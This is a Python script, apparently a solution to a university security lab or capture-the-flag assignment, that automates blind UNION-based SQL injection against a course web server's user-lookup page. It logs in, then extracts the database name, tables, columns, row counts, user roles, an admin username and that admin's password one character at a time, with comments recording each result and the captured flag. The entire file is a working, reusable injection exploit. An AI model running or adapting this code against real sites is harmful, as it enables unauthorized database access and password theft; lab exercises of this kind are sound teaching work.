import requests
import time

session = None


def crack(query, charset):
    answer = ""
    answer_arr = []

    i = 1
    while True:
        found = False
        for c in charset:
            url = "http://assignment-hermes.unimelb.life/find-user.php?username=' " + \
                query.format(index=i, answer=answer + c)
            res = session.get(url)

            if res.text == "true":
                found = True
                answer_arr.append(c)
                break
            else:
                # print(res.text)
                # return
                print(f"Index {i}; Not {c}")

            # Make sure of less than 30 requests per minute
            time.sleep(2)
            print("Sleeping")

        t = "".join(answer_arr)
        # print(t, answer)
        if t and t == answer:
            break
        else:
            answer = t

        if not found:
            answer = "".join(answer_arr)
            print(
                f"Index {i}; Not found in chartset; Found {answer} so far"
            )
            return answer

        i += 1
    print(answer)
    return answer


def crack_all(col, loc, charset, answers=[]):
    while True:
        answer = crack(
            "union select NULL,NULL,{col} from {loc} having length({col})>={{index}} and substr({col},1,{{index}})=BINARY '{{answer}}' {filter} limit 1 --+".format(
                col=col,
                loc=loc,
                filter=("and "if len(answers) else "") +
                " and ".join([f"{col}<>'{a}'" for a in answers])
            ),
            charset
        )

        if not answer or answer in answers:
            print(answers)
            return answers
            break
        else:
            answers.append(answer)
            print(answers)


def main():
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 !\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~"

    # 1. find database name: Secure
    # database = crack(
    #     "union select NULL,NULL,NULL having length(database())>={index} and substring(database(),1,{index})=BINARY '{answer}' limit 1 --+",
    #     charset
    # )

    # 2. find all tables
    # secure_tables = crack_all(
    #     "table_name",
    #     "information_schema.tables where table_schema='Secure'",
    #     charset
    # )
    # secure_tables = ["testing", "Trainings", "Users"]

    # find columns in testing table
    # testing_cols = crack_all(
    #     "column_name",
    #     "information_schema.columns where table_name='testing'",
    #     charset
    # )
    # testing_cols = ["id", "msg"]

    # count rows in testing table: 0
    # testing_nrows = len(
    #     crack(
    #         "union select NULL,NULL,count(id) from testing having count(id)>={index} limit 1 --+",
    #         "_"
    #     )
    # )
    # print(testing_nrows)

    # 3. count rows in Users table: 165
    # testing_nrows = len(
    #     crack(
    #         "union select NULL,NULL,count(id) from Users having count(id)>={index} limit 1 --+",
    #         "_"
    #     )
    # )
    # print(testing_nrows)

    # 4. count columns in Users table: 7
    # users_ncols = len(
    #     crack(
    #         "union select NULL,NULL,count(column_name) from information_schema.columns where table_name='Users' having count(column_name)>={index} limit 1 --+",
    #         "_"
    #     )
    # )
    # print(users_ncols)

    # 5. find all columns in Users table
    # users_cols = crack_all(
    #     "column_name",
    #     "information_schema.columns where table_name='Users'",
    #     charset
    # )
    # users_cols = ["api", "id", "password", "probation", "roles", "username", "website"]

    # 6. count number of distinct roles: 2
    # n_roles = len(
    #     crack(
    #         "union select NULL,NULL,count(distinct roles) from Users having count(distinct roles)>={index} limit 1 --+",
    #         "_"
    #     )
    # )
    # print(n_roles)

    # 7. find all roles
    # roles = crack_all(
    #     "roles",
    #     "Users",
    #     charset
    # )
    # roles = ["user", "HR admin"]

    # 8. find admin username
    # admin = crack(
    #     "union select NULL,roles,username from Users having length(username)>={index} and substr(username,1,{index})=BINARY '{answer}' and roles=BINARY 'HR admin' limit 1 --+",
    #     charset
    # )
    # admin = prodigysml

    # 9. find admin password
    crack(
        "union select NULL,username,password from Users having length(password)>={index} and substr(password,1,{index})=BINARY '{answer}' and username=BINARY 'prodigysml' limit 1 --+",
        charset
    )

    # FLAG{Wear_some_glasses_minions!}


if __name__ == "__main__":

    unimelb_username = "xiandew"
    session = requests.Session()
    res = session.post(
        "http://assignment-hermes.unimelb.life/auth.php",
        {
            "user": unimelb_username,
            "pass": unimelb_username
        }
    )

    if res.status_code == 200:
        print(
            f"Login to http://assignment-hermes.unimelb.life/ as {unimelb_username}")
        main()
    else:
        print("Login failed")
